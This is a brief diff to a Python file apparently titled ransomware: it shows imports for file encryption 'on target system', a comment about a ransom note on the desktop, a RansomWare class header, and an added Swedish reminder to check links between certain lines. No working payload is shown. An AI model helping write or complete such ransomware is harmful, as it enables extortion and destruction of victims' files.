@@ -1,3 +1,6 @@
+# kolla sambandet mellan rad 50 och 86 samt 170
+
+
 # Imports
 from cryptography.fernet import Fernet # encrypt/decrypt files on target system
 import os # to get system root
@@ -13,7 +16,6 @@ from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 import base64
 import threading # used for ransom note and decryption key on dekstop
-
 
 
 class RansomWare:
